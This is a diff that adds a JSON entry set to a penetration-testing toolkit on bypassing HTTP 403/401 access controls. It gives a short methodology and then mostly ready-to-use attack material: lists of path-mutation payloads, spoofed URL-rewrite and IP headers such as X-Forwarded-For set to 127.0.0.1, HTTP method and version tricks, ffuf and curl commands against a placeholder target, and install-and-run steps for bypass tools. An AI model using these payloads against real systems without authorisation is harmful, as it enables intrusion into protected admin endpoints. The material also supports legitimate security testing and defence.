@@ -1,0 +1,69 @@
+{
+  "category": "403 Bypass / access control",
+  "source": "SecLists Fuzzing/403 (@jhaddix) + PayloadsAllTheThings/403 Bypass",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "When and how 403/401 is bypassed",
+      "language": "text",
+      "tags": ["methodology", "403", "bypass", "access-control"],
+      "body": "403/401 is often enforced NOT where the request is processed: on a reverse proxy / WAF / load balancer, while the backend normalizes the path differently. That is exactly what the bypass relies on.\n\nClasses of techniques:\n1. Path mutations — the proxy sees \"/admin\" and blocks it, while the backend resolves \"/admin/.\", \"/admin..;/\", \"/%2e/admin\" to the same resource.\n2. Override headers — the proxy trusts X-Original-URL / X-Rewrite-URL (routing by them) or IP headers (X-Forwarded-For: 127.0.0.1) for \"internal-only\" endpoints.\n3. Method/version change — the ACL is set only on GET, while POST/HEAD/an arbitrary method goes through.\n4. Case and extension — /ADMIN, /admin.json, /admin;.\n\nHow to test: take a protected path (returns 403), run mutations and headers through it, WATCH for a change in the response code/size (ffuf -mc all -ac). Not every 403 can be broken: a genuine server-side ACL or a client-side redirect cannot be bypassed this way."
+    },
+    {
+      "subcategory": "Path mutations",
+      "title": "Top techniques (using /admin as an example) — copy and try",
+      "language": "text",
+      "tags": ["path", "403", "bypass"],
+      "body": "/admin/\n/admin/.\n/admin//\n//admin//\n/./admin/./\n/admin/./\n/admin/..;/\n/admin..;/\n/admin;/\n/..;/admin\n/.;/admin\n/;/admin\n//;//admin\n/%2e/admin\n/admin/%2e/\n/admin%2f\n/admin/%2f\n/admin/%20\n/admin/%09\n/admin%00\n/admin/*\n/admin/~\n/admin~\n/admin.json\n/admin.html\n/admin.css\n/admin?\n/admin#\n/admin/#/\n/admin/..%3b/\n/admin/;%2f..%2f..%2f\n/ADMIN\n/ADM+IN\n/admin/..\\;/"
+    },
+    {
+      "subcategory": "Path mutations",
+      "title": "Auto-fuzzing mutations with ffuf",
+      "language": "bash",
+      "tags": ["path", "403", "bypass", "ffuf"],
+      "body": "# Full mutation lists are already in this toolkit (⌘K): 403_url_payloads.txt (236 of them),\n# and in SecLists: /usr/share/seclists/Fuzzing/403/403.md (77 from @jhaddix).\n\n# mutation at the tail of the path\nffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac\n# mutation at the start of the path\nffuf -w 403_url_payloads.txt -u https://target/FUZZadmin -mc all -ac\n\n# -ac auto-calibrates the baseline, -mc all shows all codes — look for a response with a code/size\n# different from the original 403 (often 200/302/401)."
+    },
+    {
+      "subcategory": "Override headers",
+      "title": "URL-rewrite headers — access to a hidden path",
+      "language": "http",
+      "tags": ["header", "403", "bypass", "x-original-url"],
+      "body": "GET / HTTP/1.1\nHost: target\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Override-URL: /admin\nX-Original-Url: /admin\nRequest-URI: /admin\nReferer: https://target/admin"
+    },
+    {
+      "subcategory": "Override headers",
+      "title": "How X-Original-URL / X-Rewrite-URL work",
+      "language": "text",
+      "tags": ["header", "403", "bypass", "methodology"],
+      "body": "The request goes to an allowed path (for example \"/\"), but the front-end (Symfony, some Nginx/IIS configs, a number of proxies) routes by the value of the X-Original-URL / X-Rewrite-URL header. The proxy ACL checked \"/\" (allowed) -> let it through, and the application served /admin.\nSend one header at a time, the path in the value — WITHOUT the host, starting with a slash. Compare the response with a direct request to /admin (403)."
+    },
+    {
+      "subcategory": "Override headers",
+      "title": "IP headers — bypassing \"localhost / internal only\"",
+      "language": "http",
+      "tags": ["header", "403", "bypass", "x-forwarded-for", "ip"],
+      "body": "X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\nX-Host: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nForwarded: for=127.0.0.1\n\n# The full list of 42 headers is in the toolkit (⌘K): 403_header_payloads.txt.\n# Fuzzing: ffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H \"FUZZ\" -mc all -ac"
+    },
+    {
+      "subcategory": "Method and protocol",
+      "title": "Changing the HTTP method and version",
+      "language": "bash",
+      "tags": ["method", "403", "bypass"],
+      "body": "# The ACL is often set only on GET — try other methods\nfor m in POST HEAD OPTIONS PUT PATCH TRACE DELETE; do\n  printf \"%-7s \" $m\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m https://target/admin\ndone\n\n# An arbitrary/junk method (some servers treat it as GET)\ncurl -s -X FOO https://target/admin\n\n# Method override headers\n#   X-HTTP-Method-Override: GET\n#   X-HTTP-Method: GET\n#   X-Method-Override: GET\n\n# Downgrade the protocol version (Host-based routing/ACL may break)\ncurl -s --http1.0 https://target/admin"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Automating the 403 bypass",
+      "language": "bash",
+      "tags": ["tools", "403", "bypass"],
+      "body": "# nomore403 (Go) — paths + methods + headers automatically\ngo install github.com/devploit/nomore403@latest\nnomore403 -u https://target/admin\n\n# byp4xx — verbs / headers / path-mutations in one run\ngit clone https://github.com/lobuhi/byp4xx && cd byp4xx\n./byp4xx.sh https://target/admin\n\n# bypass-url-parser (laluka) — maximum URL mutations\npipx install bypass-url-parser\nbypass-url-parser -u \"https://target/admin\"\n\n# ffuf with the toolkit's ready-made lists (⌘K: 403_url_payloads.txt / 403_header_payloads.txt)\nffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac\nffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H \"FUZZ\" -mc all -ac\n\n# On stock Kali only ffuf/dirsearch of these are installed — byp4xx/nomore403 are installed as above.\n# Burp: the \"403 Bypasser\" / \"Bypass-403\" extensions (BApp Store)."
+    },
+    {
+      "subcategory": "Notes",
+      "title": "Signs of a bypass and nuances",
+      "language": "text",
+      "tags": ["methodology", "403", "bypass"],
+      "body": "• Success = a response with a code/size different from the reference 403 (usually 200/302/401, or a different Content-Length).\n• Combine: path + header + method at once (a combination often works, not a single one).\n• If the 403 is from a WAF (Cloudflare/Akamai/Imperva in the Server/headers) — that is a different story (WAF bypass), not a backend ACL.\n• Hit the backend/origin IP or an internal port directly, bypassing the proxy, if the address is known.\n• Try both /path and /path/ — behavior is often different.\n• Double encoding (%252e, %252f) goes through where single encoding is cut by the proxy.\n• 401 (not 403) — is sometimes bypassed with default/basic creds or the same IP header."
+    }
+  ]
+}
